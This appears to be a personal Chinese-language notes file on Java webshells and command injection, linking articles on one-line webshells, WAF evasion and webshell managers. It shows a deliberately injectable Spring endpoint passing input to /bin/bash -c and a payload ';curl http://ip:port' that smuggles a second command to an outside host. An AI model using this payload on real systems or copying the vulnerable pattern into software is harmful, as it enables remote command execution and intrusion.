# shell

偶然发现了一篇文章
>https://xz.aliyun.com/t/7798


+ [一种新型Java一句话木马的实现](https://xz.aliyun.com/t/9715)

## 命令执行的tips

https://www.anquanke.com/post/id/243329

https://xz.aliyun.com/t/7046

https://mp.weixin.qq.com/s?__biz=Mzg5MjQ1OTkwMg==&mid=2247483860&idx=1&sn=436dbdf49846851da5480e9e0c26ac23&chksm=c03c8fc5f74b06d3d6a8dba8726d4b82d811254073bbc75f982bd59f705c1e750178eddd3fe7&mpshare=1&scene=23&srcid=01302ApMKF6H7h71gWVIbJDN&sharer_sharetime=1643510224916&sharer_shareid=33a823b10ae99f33a60db621d83241cb#rd

**其实说到底是java.lang.Runtime#exec(string)一个对命令进行了空格切分（导致切分不合本意），另一个string[]是自己去分离可以执行**

下面代码是可以执行的

/cmd?command=;curl http://ip:port

```java
@GetMapping(value = "/cmd")
public void cmd(@RequestParam String command) throws Exception {
    String[] c = { "/bin/bash","-c", "hacker "+ command };///bin/bash -c hacker;ls
    Process p = Runtime.getRuntime().exec(c);
}
```

下面是不能执行的
```java
Command = "ping 127.0.0.1"+request.getParameter("cmd");
Runtime.getRuntime().exec(command);
```
## webshell 管理工具

+ [菜刀HTTP流量中转代理过WAF](https://xz.aliyun.com/t/2739) **现在来说就是bx和gsl了**
